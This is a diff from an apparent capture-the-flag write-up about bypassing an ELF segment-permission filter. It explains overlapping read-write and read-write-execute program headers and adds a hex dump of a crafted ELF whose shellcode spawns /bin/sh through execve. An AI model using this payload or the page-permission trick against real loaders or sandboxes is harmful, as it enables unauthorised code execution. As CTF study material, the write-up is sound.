@@ -72,4 +72,8 @@ elf.run()
 ```
 
 `e_type` should be `ET_EXEC`. It means elf must not have any linking. It is resolved by write shellcode and compile it. Second, it check segment's `p_flags`. `p_flags` affect program execution, so we can't use method used to solve `Extremely Lame Filters 1`. We need to know new trick haha.
-First, load the bytes with RW permission, and load same position with RWX permission, but very small length. In this case, because the program data is allocated in units of one page, the permission of that page changes to RWX. However, it check only a little bytes.
+First, load the bytes with RW permission, and load same position with RWX permission, but very small length. In this case, because the program data is allocated in units of one page, the permission of that page changes to RWX. However, it check only a little bytes. It's easy to say, but there's actually more to care about.
+
+```
+7F 45 4C 46 02 01 01 03 00 00 00 00 00 00 00 00 02 00 3E 00 01 00 00 00 E8 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 38 00 04 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 06 00 00 00 08 00 00 00 00 00 00 00 08 00 01 00 00 00 00 00 08 00 01 00 00 00 00 00 F5 00 00 00 00 00 00 00 F5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 07 00 00 00 08 00 00 00 00 00 00 00 08 00 01 00 00 00 00 00 08 00 01 00 00 00 00 00 08 00 00 00 00 00 00 00 08 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 2F 62 69 6E 2F 73 68 00 BF 01 01 02 01 81 F7 E1 01 03 01 31 D2 31 F6 6A 3B 58 0F 05
+```
